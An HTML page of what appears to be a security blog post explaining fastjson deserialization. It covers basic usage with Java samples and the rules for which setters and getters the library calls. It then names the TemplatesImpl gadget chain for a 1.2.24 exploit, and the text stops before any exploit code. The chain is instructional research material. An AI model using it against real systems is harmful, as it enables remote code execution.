<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="FastJsonSecIntroductionfastjson is a open source JSON parsing library, which supports serializing Java beans to JSON strings, and also deserializing from JSON strings to JavaBeans. Basic Usage12345&amp;lt">
<meta property="og:type" content="article">
<meta property="og:title" content="FastJsonSec">
<meta property="og:url" content="http://example.com/2023/08/04/FastJsonSec/index.html">
<meta property="og:site_name" content="P3ngu1nW">
<meta property="og:description" content="FastJsonSecIntroductionfastjson is a open source JSON parsing library, which supports serializing Java beans to JSON strings, and also deserializing from JSON strings to JavaBeans. Basic Usage12345&amp;lt">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2023/08/04/FastJsonSec/image-20230805003550356.png">
<meta property="og:image" content="http://example.com/2023/08/04/FastJsonSec/image-20230805003902084.png">
<meta property="og:image" content="http://example.com/2023/08/04/FastJsonSec/image-20230805012734185.png">
<meta property="og:image" content="http://example.com/2023/08/04/FastJsonSec/image-20230805131713035.png">
<meta property="og:image" content="http://example.com/2023/08/04/FastJsonSec/image-20230805133056366.png">
<meta property="og:image" content="http://example.com/2023/08/04/FastJsonSec/image-20230805160902499.png">
<meta property="og:image" content="http://example.com/2023/08/04/FastJsonSec/image-20230805161402128.png">
<meta property="og:image" content="http://example.com/2023/08/04/FastJsonSec/image-20230805161612800.png">
<meta property="og:image" content="http://example.com/2023/08/04/FastJsonSec/image-20230805203803915.png">
<meta property="og:image" content="http://example.com/2023/08/04/FastJsonSec/image-20230805204107155.png">
<meta property="og:image" content="http://example.com/2023/08/04/FastJsonSec/image-20230805204313793.png">
<meta property="og:image" content="http://example.com/2023/08/04/FastJsonSec/image-20230805204407754.png">
<meta property="og:image" content="http://example.com/2023/08/04/FastJsonSec/image-20230805204622397.png">
<meta property="og:image" content="http://example.com/2023/08/04/FastJsonSec/image-20230805204710853.png">
<meta property="og:image" content="http://example.com/2023/08/04/FastJsonSec/image-20230805205534911.png">
<meta property="og:image" content="http://example.com/2023/08/04/FastJsonSec/image-20230805205919968.png">
<meta property="og:image" content="http://example.com/2023/08/04/FastJsonSec/image-20230805210202373.png">
<meta property="og:image" content="http://example.com/2023/08/04/FastJsonSec/image-20230805210502088.png">
<meta property="og:image" content="http://example.com/2023/08/04/FastJsonSec/image-20230805215126381.png">
<meta property="og:image" content="http://example.com/2023/08/04/FastJsonSec/image-20230805233248120.png">
<meta property="article:published_time" content="2023-08-04T11:31:52.000Z">
<meta property="article:modified_time" content="2023-08-05T15:36:51.322Z">
<meta property="article:author" content="P3ngu1nW">
<meta property="article:tag" content="Java">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2023/08/04/FastJsonSec/image-20230805003550356.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>FastJsonSec</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/p3ngu1nw">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023/08/15/C3P0-Exploit/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/08/02/JNDI/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/08/04/FastJsonSec/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/08/04/FastJsonSec/&text=FastJsonSec"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/08/04/FastJsonSec/&title=FastJsonSec"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/08/04/FastJsonSec/&is_video=false&description=FastJsonSec"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=FastJsonSec&body=Check out this article: http://example.com/2023/08/04/FastJsonSec/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/08/04/FastJsonSec/&title=FastJsonSec"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/08/04/FastJsonSec/&title=FastJsonSec"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/08/04/FastJsonSec/&title=FastJsonSec"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/08/04/FastJsonSec/&title=FastJsonSec"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/08/04/FastJsonSec/&name=FastJsonSec&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/08/04/FastJsonSec/&t=FastJsonSec"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#FastJsonSec"><span class="toc-number">1.</span> <span class="toc-text">FastJsonSec</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Basic-Usage"><span class="toc-number">1.2.</span> <span class="toc-text">Basic Usage</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POJO-x3D-gt-JSON"><span class="toc-number">1.2.1.</span> <span class="toc-text">POJO &#x3D;&gt; JSON</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JSON-x3D-gt-POJO"><span class="toc-number">1.2.2.</span> <span class="toc-text">JSON &#x3D;&gt; POJO</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JSON-parseObject-with-target-class"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">JSON.parseObject with target class</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JSON-parseObject-without-target-class"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">JSON.parseObject without target class</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JSON-parse"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">JSON.parse</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Feature"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">Feature</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Principles"><span class="toc-number">1.3.</span> <span class="toc-text">Vulnerability Principles</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#setter"><span class="toc-number">1.3.1.</span> <span class="toc-text">setter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getter"><span class="toc-number">1.3.2.</span> <span class="toc-text">getter</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson-1-2-22-1-2-24-Exploit"><span class="toc-number">1.4.</span> <span class="toc-text">FastJson 1.2.22~1.2.24 Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ENV"><span class="toc-number">1.4.1.</span> <span class="toc-text">ENV</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TemplateImpl"><span class="toc-number">1.4.2.</span> <span class="toc-text">TemplateImpl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JdbcRowSetImpl"><span class="toc-number">1.4.3.</span> <span class="toc-text">JdbcRowSetImpl</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RMI-before-jdk8u113"><span class="toc-number">1.4.3.1.</span> <span class="toc-text">RMI(before jdk8u113)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LDAP-before-jdk8u191"><span class="toc-number">1.4.3.2.</span> <span class="toc-text">LDAP(before jdk8u191)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bypass-jdk-limit"><span class="toc-number">1.4.3.3.</span> <span class="toc-text">bypass jdk limit</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson-1-2-25-1-2-41-Exploit"><span class="toc-number">1.5.</span> <span class="toc-text">FastJson 1.2.25~1.2.41 Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass"><span class="toc-number">1.5.1.</span> <span class="toc-text">Bypass</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson-1-2-25-1-2-42-Exploit"><span class="toc-number">1.6.</span> <span class="toc-text">FastJson 1.2.25~1.2.42 Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson-1-2-25-1-2-43-Exploit"><span class="toc-number">1.7.</span> <span class="toc-text">FastJson 1.2.25~1.2.43 Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson-1-2-25-1-2-45-Exploit"><span class="toc-number">1.8.</span> <span class="toc-text">FastJson 1.2.25~1.2.45 Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson-1-2-25-1-2-47-Exploit-Bypass-AutoType"><span class="toc-number">1.9.</span> <span class="toc-text">FastJson 1.2.25~1.2.47 Exploit (Bypass AutoType)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson-1-2-5-1-2-59-Exploit"><span class="toc-number">1.10.</span> <span class="toc-text">FastJson 1.2.5~1.2.59 Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson-1-2-5-1-2-60-Exploit"><span class="toc-number">1.11.</span> <span class="toc-text">FastJson 1.2.5~1.2.60 Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson-1-2-62-Exploit"><span class="toc-number">1.12.</span> <span class="toc-text">FastJson 1.2.62 Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson-1-2-66-Exploit"><span class="toc-number">1.13.</span> <span class="toc-text">FastJson 1.2.66 Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson-1-2-67-Exploit"><span class="toc-number">1.14.</span> <span class="toc-text">FastJson 1.2.67 Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson-1-2-68-Exploit-Using-expectClass-Bypass-AutoType"><span class="toc-number">1.15.</span> <span class="toc-text">FastJson 1.2.68 Exploit (Using expectClass Bypass AutoType)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-number">1.15.1.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Code-Analysing"><span class="toc-number">1.15.2.</span> <span class="toc-text">Code Analysing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Realworld-Exploit"><span class="toc-number">1.15.3.</span> <span class="toc-text">Realworld Exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson-with-Native-Deserialization"><span class="toc-number">1.16.</span> <span class="toc-text">FastJson with Native Deserialization</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FastJson-lt-x3D-1-2-48"><span class="toc-number">1.16.1.</span> <span class="toc-text">FastJson &lt;&#x3D; 1.2.48</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FastJson-gt-x3D-1-2-49"><span class="toc-number">1.16.2.</span> <span class="toc-text">FastJson &gt;&#x3D; 1.2.49</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.17.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        FastJsonSec
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">P3ngu1nW</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-08-04T11:31:52.000Z" class="dt-published" itemprop="datePublished">2023-08-04</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/Java/" rel="tag">Java</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="FastJsonSec"><a href="#FastJsonSec" class="headerlink" title="FastJsonSec"></a>FastJsonSec</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>fastjson is a open source JSON parsing library, which supports serializing Java beans to JSON strings, and also deserializing from JSON strings to JavaBeans.</p>
<h2 id="Basic-Usage"><a href="#Basic-Usage" class="headerlink" title="Basic Usage"></a>Basic Usage</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="POJO-x3D-gt-JSON"><a href="#POJO-x3D-gt-JSON" class="headerlink" title="POJO &#x3D;&gt; JSON"></a>POJO &#x3D;&gt; JSON</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Construct Method&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name + <span class="string">&quot; &quot;</span> + <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">P3ngu1nW</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        P3ngu1nW.setName(<span class="string">&quot;P3ngu1nW&quot;</span>);</span><br><span class="line">        P3ngu1nW.setAge(<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">JsonString</span> <span class="operator">=</span> JSON.toJSONString(P3ngu1nW, SerializerFeature.WriteClassName);</span><br><span class="line"></span><br><span class="line">        System.out.println(JsonString);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Output: </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Construct Method</span><br><span class="line">setName</span><br><span class="line">setAge</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">&#123;&quot;@type&quot;:&quot;Person&quot;,&quot;age&quot;:20,&quot;name&quot;:&quot;P3ngu1nW&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>Here the <strong>SerializerFeature.WriteClassName</strong> means the output json will write the class name in the field <code>@type</code></p>
<p><code>@type</code> specifies the class to deserialize and calls its getter&#x2F;setter&#x2F;is methods.</p>
<h3 id="JSON-x3D-gt-POJO"><a href="#JSON-x3D-gt-POJO" class="headerlink" title="JSON &#x3D;&gt; POJO"></a>JSON &#x3D;&gt; POJO</h3><h4 id="JSON-parseObject-with-target-class"><a href="#JSON-parseObject-with-target-class" class="headerlink" title="JSON.parseObject with target class"></a>JSON.parseObject with target class</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">P3ngu1nW</span> <span class="operator">=</span> JSON.parseObject(<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Person\&quot;,\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;P3ngu1nW\&quot;&#125;&quot;</span>, Person.class, Feature.SupportNonPublicField);</span><br><span class="line">        System.out.println(P3ngu1nW);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Output:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Construct Method</span><br><span class="line">setAge</span><br><span class="line">setName</span><br><span class="line">P3ngu1nW 20</span><br></pre></td></tr></table></figure>

<h4 id="JSON-parseObject-without-target-class"><a href="#JSON-parseObject-without-target-class" class="headerlink" title="JSON.parseObject without target class"></a>JSON.parseObject without target class</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">P3ngu1nW</span> <span class="operator">=</span> JSON.parseObject(<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Person\&quot;,\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;P3ngu1nW\&quot;&#125;&quot;</span>);</span><br><span class="line">        System.out.println(P3ngu1nW.getClass().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Output:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Construct Method</span><br><span class="line">setAge</span><br><span class="line">setName</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">com.alibaba.fastjson.JSONObject</span><br></pre></td></tr></table></figure>

<h4 id="JSON-parse"><a href="#JSON-parse" class="headerlink" title="JSON.parse"></a>JSON.parse</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">P3ngu1nW</span> <span class="operator">=</span> JSON.parse(<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Person\&quot;,\&quot;age\&quot;:20,\&quot;name\&quot;:\&quot;P3ngu1nW\&quot;&#125;&quot;</span>);</span><br><span class="line">        System.out.println(P3ngu1nW.getClass().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Output</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Construct Method</span><br><span class="line">setAge</span><br><span class="line">setName</span><br><span class="line">Person</span><br></pre></td></tr></table></figure>



<h4 id="Feature"><a href="#Feature" class="headerlink" title="Feature"></a>Feature</h4><ul>
<li>Here the <strong>Feature.SupportNonPublicField</strong> means the private variables don’t have a setter method, but we still want to assign a value to the variable when deserializing it.</li>
<li><code>JSON.parse(text)</code> and <code>JSON.parseObject(text, Type)</code> will return the original object and only call the setter methods.</li>
<li><code>JSON.parseObject(text)</code> will return a JSONObject, and call the setter and getter methods.</li>
<li>If the Field type is <code>byte[]</code>, it will call base64 decoding.</li>
<li>When fastjson is looking for a get&#x2F;set method for a class attribute, it will ignore the <code>_|-</code> characters.</li>
</ul>
<h2 id="Vulnerability-Principles"><a href="#Vulnerability-Principles" class="headerlink" title="Vulnerability Principles"></a>Vulnerability Principles</h2><p>Fastjson will call setter&#x2F;getter methods that meet the following requirements:</p>
<h3 id="setter"><a href="#setter" class="headerlink" title="setter"></a>setter</h3><ul>
<li>Non-static method</li>
<li>The return type is void or the current class</li>
<li>only one argument</li>
</ul>
<h3 id="getter"><a href="#getter" class="headerlink" title="getter"></a>getter</h3><ul>
<li>Non-static method</li>
<li>No argument</li>
<li>The return value type is inherited from Collection or Map or AtomicBoolean or AtomicInteger.</li>
</ul>
<h2 id="FastJson-1-2-22-1-2-24-Exploit"><a href="#FastJson-1-2-22-1-2-24-Exploit" class="headerlink" title="FastJson 1.2.22~1.2.24 Exploit"></a>FastJson 1.2.22~1.2.24 Exploit</h2><h3 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h3><ul>
<li>jdk8u65</li>
<li>Fastjson 1.2.24</li>
</ul>
<h3 id="TemplateImpl"><a href="#TemplateImpl" class="headerlink" title="TemplateImpl"></a>TemplateImpl</h3><p>In <code>TemplateImpl#getTransletInstance</code>, we can call then <code>defineTransletClasses</code> to load the evil class.</p>
<img src="/2023/08/04/FastJsonSec/image-20230805003550356.png" class title="image-20230805003550356">

<p>However, the getter  <code>getTransletInstance</code>  seems not to be a valid method.</p>
<p>So let’s check the usage and we can find a gadget chain to call this method:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties()-&gt;newTransformer-&gt;getTransletInstance()</span><br></pre></td></tr></table></figure>

<img src="/2023/08/04/FastJsonSec/image-20230805003902084.png" class title="image-20230805003902084">

<p>Besides, the getter <code>getOutputProperties</code> is a valid method.</p>
<p>So let’s try to write a exp</p>
